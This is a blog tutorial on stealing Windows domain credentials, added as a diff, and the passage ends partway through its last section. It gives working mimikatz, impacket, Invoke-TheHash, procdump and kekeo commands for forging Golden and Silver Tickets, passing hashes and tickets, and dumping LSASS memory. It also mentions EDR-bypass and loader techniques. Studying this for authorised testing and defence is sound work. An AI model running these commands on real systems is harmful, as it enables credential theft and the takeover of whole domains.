@@ -1,0 +1,674 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Computer, Network, Security">
+    <meta name="description" content="a blog on Hexo">
+    <meta name="author" content="TyeYeah">
+    
+    <title>
+        
+            About Stealing Credentials |
+        
+        Relish the Moment
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="/img/wang.svg">
+    
+<link rel="stylesheet" href="/css/font-awesome.min.css">
+
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en","path":"search.xml"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"/img/aliwangwang.svg","favicon":"/img/wang.svg","article_img_align":"center","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":true,"scale":true},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"Keep writing and Keep loving."},"scroll":{"progress_bar":{"enable":true},"percent":{"enable":true}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":"3.4.3"};
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+  </script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                Relish the Moment
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                HOME
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                ARCHIVES
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories"
+                            >
+                                CATEGORIES
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >
+                                TAGS
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                ABOUT
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">HOME</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">ARCHIVES</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories">CATEGORIES</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags">TAGS</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about">ABOUT</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">About Stealing Credentials</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/img/aliwangwang.svg">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">TyeYeah</span>
+                        
+                            <span class="author-label">Lv4</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i>&nbsp;2020-05-25 14:37:03
+    </span>
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/Penetration-Testing/">Penetration Testing</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/windows/">windows</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/pentest/">pentest</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/domain/">domain</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fas fa-file-word"></i>&nbsp;<span>2.6k Words</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fas fa-clock"></i>&nbsp;<span>16 Mins</span>
+        </span>
+    
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <p>This part we discuss about how to steal credentials in <code>Domain</code> pentest.</p>
+<h2 id="Basic-Knowledge"><a href="#Basic-Knowledge" class="headerlink" title="Basic Knowledge"></a>Basic Knowledge</h2><p>Before running powerfull tools, we have many concepts to know, like policies of storing passwords.. </p>
+<h3 id="NTLM-Protocol"><a href="#NTLM-Protocol" class="headerlink" title="NTLM Protocol"></a>NTLM Protocol</h3><p>In <code>Workgroup</code>, password hashes are saves in local <code>SAM</code> file in <code>%SystemRoot%\system32\config\sam</code>; in <code>Domain</code>, they are saved in file <code>ntds.dit</code> in <code>%SystemRoot%\NTDS</code> of <code>Domain Controllers</code>. Hashes have a format of: USERNAME:SID:LM-Hash:NT-Hash, like: <code>Administrator:500:aad3b435b51404eeaad3b435b51404ee:32057716c8bd0647d9197a9db0b041eb:::</code></p>
+<h4 id="LM-Hash"><a href="#LM-Hash" class="headerlink" title="LM Hash"></a>LM Hash</h4><p><code>LM Hash</code> (LAN Manager Hash) is a way of hash.<br>It converts all letters to uppercase, then converts them to <code>hex</code>. If binary has less than 14 bytes, <code>0</code> needs to add to complete 14 bytes.<br>Then it seperates these 14 bytes into 2 parts, 7 bytes every part, and we add one <code>0</code> at each end.<br>Here we have a magic string: <code>KGS!@#$%</code>. We use it as the key, to do DES encryption for these 2 parts (8 bytes for each). Finally we get <code>LM Hash</code>.</p>
+<h4 id="NTLM-Hash"><a href="#NTLM-Hash" class="headerlink" title="NTLM Hash"></a>NTLM Hash</h4><p>Since Windows Vista, passwords are defaultly stored as <code>NTLM Hash</code>, not <code>LM Hash</code>.<br><code>NTLM Hash</code> firstly converts password to <code>hex</code>, then to <code>unicode</code>, and finally <code>MD4</code> hash.</p>
+<h4 id="NTLM-Authentication"><a href="#NTLM-Authentication" class="headerlink" title="NTLM Authentication"></a>NTLM Authentication</h4><p><img src="/imghost/asc/1.png" alt="NTLM Authentication"></p>
+<ol>
+<li>Client inputs username &amp; password, then request by sending plain text username to Server.</li>
+<li>Server receives request, and sends a random 16 bits (8 bits for NTLM v1, 16bits for NTLM v2) <code>challenge</code> number. Get it hashed by stored <code>NTLM Hash</code>, and saves as <code>challenge1</code>.</li>
+<li>Client receives <code>challenge</code>, and hashes it using local password hash as response (<code>challenge2</code>).</li>
+<li>Server receives response, compares <code>challenge1</code> and <code>challenge2</code> to auth.<h3 id="Kerberos-Protocol"><a href="#Kerberos-Protocol" class="headerlink" title="Kerberos Protocol"></a>Kerberos Protocol</h3><code>Kerberos</code> is a network auth protocol used in <code>Domain</code>, and it serves for C/S programs.<br>There are there roles in the <code>Kerberos</code> protocol:</li>
+</ol>
+<ul>
+<li>Client</li>
+<li>Server</li>
+<li>KDC<ul>
+<li>AS: check Client.</li>
+<li>TGS: generate ST (Silver TGS Ticket) for Client to access some server.</li>
+</ul>
+</li>
+</ul>
+<p><img src="/imghost/asc/2.png" alt="Kerberos"></p>
+<ol>
+<li>Client sends a auth request (<code>KRB_AS_REQ</code>) to KDC (<code>AS</code>), with a time stamp encrypted by Client hash. AS receives request and decrypts time stamp with hash in Server side, if it is in a certain time range, means successful authentication.</li>
+<li><code>AS</code> checks if user exists in database, then decrypts data with Client hash. If successful, return the TGT (Ticket Granting Ticket) Ticket (<code>Golden Ticket</code>) encrypted by <code>krbtgt</code> (special user, service account in KDC) password hash, and a session key (<code>sessionkey1</code>), which is randomly generated by KDC, and encrypted by Client <code>NTLM hash</code> as <code>KRB_AS_REP</code>. Client cannot decrypt TGT Ticket, but with <code>krbtgt</code> hash we can forge a <code>Golden Ticket</code></li>
+<li>Client decrypts <code>sessionkey1</code>, using own password. Client uses decrypted <code>sessionkey1</code> to encrypt time stamp, then sends them all to TGS for ticket to access Server (<code>KRB_TGS_REQ</code>).</li>
+<li>TGS receives request, and check whether the Service that Client access is valid. If successful, KDC decrypts <code>Golden Ticket</code> with <code>krbtgt</code> password hash, to see time stamp in it. If <code>Golden Ticket</code> is still valid, return session key encrypted by <code>sessionkey1</code>, and a ticket to Client (<code>KRB_TGS_REP</code>). In TGS response, ticket is encrypted with Server hash, so if we have Server hash, we can forge a <code>Silver Ticket</code>.</li>
+<li>Client decrypts <code>sessionkey1</code> as session key (<code>sessionkey2</code>), then uses it to encrypt time stamp and ticket (<code>KRB_AP_REQ</code>), finally sends to Server.</li>
+<li>Server decrypts ticket using own hash to get <code>sessionkey2</code>. Use <code>sessionkey2</code> to decrypt time stamp. After that Server uses PAC to ask KDC whether Client is able to access. <code>Domain Controller</code> decrypt PAC to let Client know whether it’s the right Server.</li>
+</ol>
+<p>All Kerberos tickets are stored in <code>LSASS</code> process in memory.</p>
+<h3 id="Golden-Ticket"><a href="#Golden-Ticket" class="headerlink" title="Golden Ticket"></a>Golden Ticket</h3><p>It appears in Step.2 of <code>Kerberos</code> protocol, which is the TGT Ticket(20 mins valid), delivered to Client by AS. It is encrypted by <code>krbtgt</code> password hash which is normally unchanged, so if <code>Domain Controller</code> changes password, we can still forge a <code>Golden Ticket</code> to control.</p>
+<p>A <code>Golden Ticket</code> consists of <code>Domain Name</code>, <code>Domain SID</code>, <code>krbtgt</code> password hash, and forged username. We can use <code>mimikatz</code>, <code>cobaltstrike</code> and <code>metasploit</code> to do forgery.</p>
+<h4 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h4><p>Export <code>krbtgt</code> password hash (aes256_hmac).</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # privilege::debug      </span><br><span class="line">mimikatz # lsadump::dcsync /domain:domain_name /user:krbtgt</span><br></pre></td></tr></table></figure>
+<p>Then get <code>Domain SID</code> (SID without the <code>-number</code> at the end)</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; whoami /all</span><br></pre></td></tr></table></figure>
+<p>Forge <code>Golden Ticket</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # kerberos::golden /domain:domain_name /sid:S-1-5-21-xxxxxxxxxx-xxxxxxxxxx-xxxxxxxxxx /aes256:krbtgt_password_hash /user:user_name /ticket:gold.kirbi</span><br></pre></td></tr></table></figure>
+<p>Finally import ticket.</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt c:\Users\your_user_name\gold.kirbi</span><br></pre></td></tr></table></figure>
+<p>Another way is (using rc4_plain)</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:domain_name /sid:S<span class="literal">-1</span><span class="literal">-5</span><span class="literal">-21</span><span class="literal">-xxxxxxxxxx</span><span class="literal">-xxxxxxxxxx</span><span class="literal">-xxxxxxxxxx</span> /rc4:krbtgt_password_hash /user:user_name /ptt</span><br></pre></td></tr></table></figure>
+<h4 id="CobaltStrike"><a href="#CobaltStrike" class="headerlink" title="CobaltStrike"></a>CobaltStrike</h4><p>After one beacon is online -&gt; Execute -&gt; Golden Ticket </p>
+<h4 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h4><p>In the metepreter, frst load module.</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; load kiwi</span><br></pre></td></tr></table></figure>
+<p>Generate Golden Ticket.</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; golden_ticket_create -d domain_name -k krbtgt_password_hash -s S-1-5-21-xxxxxxxxxx-xxxxxxxxxx-xxxxxxxxxx -u user_name -t /tmp/golden.ticket</span><br></pre></td></tr></table></figure>
+<p>Import into memory</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; kerberos_ticket_use /tmp/golden.ticket</span><br></pre></td></tr></table></figure>
+<h3 id="Silver-Ticket"><a href="#Silver-Ticket" class="headerlink" title="Silver Ticket"></a>Silver Ticket</h3><p>It is ST that TGS delivers to Client in Step.4 and Step.5 of <code>Kerberos</code> protocol. Server will decrypt Client with Client hash, so this process doesn’t go via kDC, but <code>Silver Ticket</code> can be only used for once.</p>
+<p>A <code>Silver Ticket</code> consists of <code>Domain Name</code>, <code>Domain SID</code>, <code>Domain</code> Service <code>NTLM hash</code>, forged username, and target <code>Kerberos</code> service.<br>Common services like:</p>
+<table>
+<thead>
+<tr>
+<th>Service Note</th>
+<th>Service Name</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>WMI</td>
+<td>HOST, RPCSS</td>
+</tr>
+<tr>
+<td>Powershell Remoting</td>
+<td>HOST, HTTP</td>
+</tr>
+<tr>
+<td>WinRM</td>
+<td>HOST, HTTP</td>
+</tr>
+<tr>
+<td>Scheduled Tasks</td>
+<td>Host</td>
+</tr>
+<tr>
+<td>LADP, DCSync</td>
+<td>LDAP</td>
+</tr>
+<tr>
+<td>Windows File Share</td>
+<td>CIFS</td>
+</tr>
+<tr>
+<td>Windows Remote Server AdministrationTools</td>
+<td>RPCSS, LDAP, CIFS</td>
+</tr>
+</tbody></table>
+<p>Forge the <code>Silver Ticket</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # kerberos::golden /domain:domain_name /sid:S-1-5-21-xxxxxxxxxx-xxxxxxxxxx-xxxxxxxxxx /target:domain_target_member /service:cifs /rc4:krbtgt_password_hash /user:user_name /ptt</span><br></pre></td></tr></table></figure>
+<p>To defend this, add <code>ValidateKdcPacSignature</code> with value <code>1</code>.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Kerberos\Parameters</span><br></pre></td></tr></table></figure>
+<h3 id="Other-Methods-to-Abuse-Kerberos"><a href="#Other-Methods-to-Abuse-Kerberos" class="headerlink" title="Other Methods to Abuse Kerberos"></a>Other Methods to Abuse Kerberos</h3><p>Other than <code>Golden Ticket</code> Attack and <code>Silver Ticket</code> Attack, there are <a class="link"   target="_blank" rel="noopener" href="https://www.hackingarticles.in/kerberos-brute-force-attack/" >Kerberos Brute Force Attack<i class="fas fa-external-link-alt"></i></a>, <a class="link"   target="_blank" rel="noopener" href="https://www.hackingarticles.in/deep-dive-into-kerberoasting-attack/" >Kerberoasting<i class="fas fa-external-link-alt"></i></a>, and <a class="link"   target="_blank" rel="noopener" href="https://www.hackingarticles.in/as-rep-roasting/" >AS-REP Roasting<i class="fas fa-external-link-alt"></i></a> …</p>
+<h3 id="Pass-The-Hash"><a href="#Pass-The-Hash" class="headerlink" title="Pass The Hash"></a>Pass The Hash</h3><p>“Pass the hash” (<code>PTH</code>) allows attackers to authenticate by using the underlying NTLM or LanMan hash of a user’s password, instead of requiring the associated plaintext password as is normally the case. </p>
+<p>Hash can be devided into <code>LM Hash</code> and <code>NTLM Hash</code> which mentioned <a href="#NTLM-Protocol">before</a>. If length of password goes beyond 15, <code>LM Hash</code> will not be generated, and it has been disabled since Windows Vista and Windows Server 2008, so most of the time we try to capture <code>NTLM hash</code> for <code>PTH</code>.</p>
+<p>The <code>PTH</code> pentest is:</p>
+<ol>
+<li>Controll a <code>Domain</code> Member.</li>
+<li>Dump user password hash.</li>
+<li>Use <code>PTH</code> to log in to other pc and keep on dumping hashes.</li>
+<li>Keep searching hash of <code>Domain Controller</code>, then take over the <code>Domain</code>.</li>
+</ol>
+<h4 id="Capture-NTLM-Hash"><a href="#Capture-NTLM-Hash" class="headerlink" title="Capture NTLM Hash"></a>Capture <code>NTLM Hash</code></h4><p><code>NTLM</code>(NT LAN Manager) is the only successor of <code>LM</code> (LAN Manager), and it adds a Challenge-Response verification mechanism which was introduced <a href="#NTML-Hash">here</a>.</p>
+<p>For <code>NTLM</code> we also have <code>NTLM Hash</code> and <code>Net-NTLM Hash</code>.<br><code>NTLM Hash</code> is stored in local <code>SAM</code> (Security Account Manager) file, so you can use <code>mimikatz</code> to extract from <code>SAM</code> or <code>NTDS.dit</code> of <code>Domian Controller</code>.<br><code>Net-NTLM Hash</code> is in the response of Challenge-Response verification. A popular util <a class="link"   target="_blank" rel="noopener" href="https://github.com/lgandx/Responder" >Responder<i class="fas fa-external-link-alt"></i></a> is borned for this (and <a class="link"   target="_blank" rel="noopener" href="https://github.com/Kevin-Robertson/Inveigh" >Inveigh<i class="fas fa-external-link-alt"></i></a> in <code>Powershell</code>.)<br>After acquiring the hash, use <a target="_blank" rel="noopener" href="https://github.com/hashcat/hashcat.git"><code>hashcat</code></a> to brute force using dictionaries, or just pass the hash to login.</p>
+<h4 id="PTH-Tools"><a href="#PTH-Tools" class="headerlink" title="PTH Tools"></a><code>PTH</code> Tools</h4><p>On <code>Kali</code>, we have <code>meterpreter</code> and some other tools sets, like <code>exploit/windows/smb/psexec</code> module in <code>msf</code>.</p>
+<p>In Python library <code>impacket</code>, we have <a class="link"   target="_blank" rel="noopener" href="https://raw.githubusercontent.com/SecureAuthCorp/impacket/0b46f198042626a1ecd2846d22db355453e29c03/examples/smbexec.py" >smbexec<i class="fas fa-external-link-alt"></i></a>:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python smbexec.py -<span class="built_in">hash</span> LM-Hash:NT-Hash user_name@target_ip</span><br><span class="line">or</span><br><span class="line">python smbexec.py -hashes :NT-Hash user_name@target_ip <span class="comment"># no need for LM-Hash</span></span><br></pre></td></tr></table></figure>
+<p>On Windows we have <a target="_blank" rel="noopener" href="https://github.com/CoreSecurity/impacket/blob/master/examples/wmiexec.py"><code>wmiexec.py</code></a> and <a class="link"   target="_blank" rel="noopener" href="https://github.com/maaaaz/impacket-examples-windows" >exe version<i class="fas fa-external-link-alt"></i></a>.</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; wmiexec <span class="literal">-hashes</span> <span class="number">00000000000000000000000000000000</span>:<span class="number">7</span>ECFFFF0C3548187607A14BAD0F88BB1 TEST/test1@<span class="number">192.168</span>.<span class="number">1.1</span> <span class="string">&quot;whoami&quot;</span></span><br></pre></td></tr></table></figure>
+<p>Parameter <code>hashes</code> goes like: <code>LM-HASH:NTLM-HASH</code>.</p>
+<p>We also have powerful <a target="_blank" rel="noopener" href="https://github.com/Kevin-Robertson/Invoke-TheHash/"><code>Powershell</code> Tools</a>.<br><code>Invoke-WMIExec</code> is like <code>wmiexec.py</code></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="built_in">Invoke-WMIExec</span> <span class="literal">-Target</span> target_ip <span class="literal">-Domain</span> domain_name <span class="literal">-Username</span> user_name <span class="literal">-Hash</span> ntlm_hash <span class="literal">-Command</span> <span class="string">&quot;calc.exe&quot;</span> <span class="literal">-verbose</span></span><br></pre></td></tr></table></figure>
+<p><code>Invoke-SMBExec</code> using <code>system</code> privilege to execute on target.</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="built_in">Invoke-SMBExec</span> <span class="literal">-Target</span> target_ip <span class="literal">-Domain</span> domain_name <span class="literal">-Username</span> user_name <span class="literal">-Hash</span> ntlm_hash <span class="literal">-Command</span> <span class="string">&quot;calc.exe&quot;</span> <span class="literal">-verbose</span></span><br></pre></td></tr></table></figure>
+<h4 id="Pass-The-Key"><a href="#Pass-The-Key" class="headerlink" title="Pass The Key"></a>Pass The Key</h4><p>We should get:</p>
+<ul>
+<li>Username</li>
+<li><code>Domain Name</code></li>
+<li><code>NTLM Hash</code></li>
+</ul>
+<p>Use <code>mimikatz</code>:</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; mimikatz <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::pth /user:user_name /domain:domain_name /ntlm: ntlm_hash&quot;</span></span><br></pre></td></tr></table></figure>
+<p>A cmd will pop up.</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="built_in">dir</span> \\target_ip\c<span class="variable">$</span></span><br></pre></td></tr></table></figure>
+<p>It’ll be successful.</p>
+<p>Actually <code>sekurlsa::pth</code> in <code>mimikatz</code> is called <code>Overpass-the-Hash</code>, aka <code>Pass-the-Key</code>.</p>
+<p>Note: “ntlm hash is mandatory on XP/2003/Vista/2008 and before 7/2008r2/8/2012 kb2871997 (AES not available or replaceable) ; AES keys can be replaced only on 8.1/2012r2 or 7/2008r2/8/2012 with kb2871997, in this case you can avoid ntlm hash.”<br>Which means we can also conduct <code>PTH</code> with AES keys, if <code>kb2871997</code> is patched/installed.</p>
+<p>Still in <code>mimikatz</code>:</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; mimikatz <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::pth /user:user_name /domain:domain_name /aes256: aes256_hmac&quot;</span> </span><br></pre></td></tr></table></figure>
+<h4 id="Pass-The-Ticket"><a href="#Pass-The-Ticket" class="headerlink" title="Pass The Ticket"></a>Pass The Ticket</h4><p>Because <code>PTH</code> of <code>mimikatz</code> needs privilege as Admin, <code>mimikatz</code> provides another way that dont need – <code>Pass-the-Ticket</code>. It requires a open source util: <a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/kekeo"><code>kekeo</code></a>.</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; kekeo <span class="string">&quot;tgt::ask /user:user_name /domain:domain_name /ntlm:ntlm_hash&quot;</span></span><br></pre></td></tr></table></figure>
+<p>Then it generates a ticket, we import it.</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; kekeo <span class="string">&quot;kerberos::ptt TGT_xx@xxx_krbtgt~xxx@xxx.xxxx&quot;</span></span><br></pre></td></tr></table></figure>
+<h4 id="Related"><a href="#Related" class="headerlink" title="Related"></a>Related</h4><p><a class="link"   target="_blank" rel="noopener" href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Pass-the-Hash-with-Remote-Desktop(Restricted-Admin-mode)/" >Pass the Hash with Remote Desktop (Restricted Admin mode)<i class="fas fa-external-link-alt"></i></a> and <a class="link"   target="_blank" rel="noopener" href="https://www.4hou.com/posts/1QWo" >Pass the Hash with Remote Desktop Protocol<i class="fas fa-external-link-alt"></i></a></p>
+<h2 id="Steal-Credentials"><a href="#Steal-Credentials" class="headerlink" title="Steal Credentials"></a>Steal Credentials</h2><p>Credentials can be plain text password, or password hash. With either of them, login and controlling target will be easier.</p>
+<h3 id="From-lsass-exe-Process"><a href="#From-lsass-exe-Process" class="headerlink" title="From lsass.exe Process"></a>From <code>lsass.exe</code> Process</h3><p>As I mentioned, all Kerberos tickets are stored in <code>LSASS</code> process in memory.</p>
+<h4 id="Normal-Ways"><a href="#Normal-Ways" class="headerlink" title="Normal Ways"></a>Normal Ways</h4><p>Use <code>mimikatz</code> (will be detected)</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe log <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::logonPasswords full&quot;</span> <span class="keyword">exit</span></span><br></pre></td></tr></table></figure>
+<p>Or dump memory and export credentials. For example, <code>procdump</code></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; procdump64.exe <span class="literal">-accepteula</span> <span class="literal">-ma</span> lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure>
+<p>Other tools like <a class="link"   target="_blank" rel="noopener" href="https://github.com/killswitch-GUI/minidump-lib" >minidump-lib<i class="fas fa-external-link-alt"></i></a> in C++, <a class="link"   target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1" >Out-Minidump.ps1<i class="fas fa-external-link-alt"></i></a> in Powershell, and <a class="link"   target="_blank" rel="noopener" href="https://github.com/GhostPack/SharpDump" >SharpDump<i class="fas fa-external-link-alt"></i></a> in C#.<br><code>comsvcs.dll</code> can also be used, but it needs <code>SeDebugPrivilege</code> privilege, so only in Powershell as Administrator will this privilege status be <code>Enable</code>(even cmd as Administrator has it <code>Disabled</code>).</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; powershell <span class="literal">-c</span> <span class="string">&quot;rundll32 C:\windows\system32\comsvcs.dll, MiniDump 808 C:\test\lsass.dmp full&quot;</span></span><br></pre></td></tr></table></figure>
+<p>Actually all above are using API <code>MiniDumpWriteDump()</code> to get process dump, and some antivirus softwares start to block it by API hook (edit 5 bytes at the start of <code>NtReadVirtualMemory()</code>). We can fix that 5 bytes, and rewrite <code>NtReadVirtualMemory()</code>. See <a class="link"   target="_blank" rel="noopener" href="https://medium.com/@fsx30/bypass-edrs-memory-protection-introduction-to-hooking-2efb21acffd6" >Bypass EDR’s memory protection, introduction to hooking<i class="fas fa-external-link-alt"></i></a> and the tool – <a class="link"   target="_blank" rel="noopener" href="https://github.com/outflanknl/Dumpert" >Dumpert<i class="fas fa-external-link-alt"></i></a>.</p>
+<p>After dumping, use <code>mimikatz</code> to export credentials.</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe log <span class="string">&quot;sekurlsa::minidump lsass.dmp&quot;</span> <span class="string">&quot;sekurlsa::logonPasswords full&quot;</span> <span class="keyword">exit</span></span><br></pre></td></tr></table></figure>
+<h4 id="Limited-Upload-Length"><a href="#Limited-Upload-Length" class="headerlink" title="Limited Upload Length"></a>Limited Upload Length</h4><p>Based on <a class="link"   target="_blank" rel="noopener" href="https://github.com/re4lity/subTee-gits-backups/blob/master/PELoader.cs" >PELoader.cs<i class="fas fa-external-link-alt"></i></a>, a newer <code>mimikatz</code> was packed in <a class="link"   target="_blank" rel="noopener" href="https://github.com/3gstudent/Homework-of-C-Sharp/blob/master/PELoaderofMimikatz.cs" >PELoaderofMimikatz.cs<i class="fas fa-external-link-alt"></i></a>. They load a compressed <code>mimikatz</code> whiling running.<br>Use <code>csc.exe</code> to compile</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; C:\Windows\Microsoft.NET\Framework64\v3.<span class="number">5</span>\csc.exe PELoaderofMimikatz.cs /unsafe</span><br><span class="line"><span class="comment">#or</span></span><br><span class="line">&gt; C:\Windows\Microsoft.NET\Framework64\v4.<span class="number">0.30319</span>\csc.exe PELoaderofMimikatz.cs /unsafe</span><br></pre></td></tr></table></figure>
+<p>Export credentials</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PELoaderofMimikatz.exe log <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::logonPasswords full&quot;</span> <span class="keyword">exit</span></span><br></pre></td></tr></table></figure>
+<p>Or add commands first (compile as PELoaderofMimikatzAuto.exe), then use <code>InstallUtil.exe</code> to export credentials.</p>
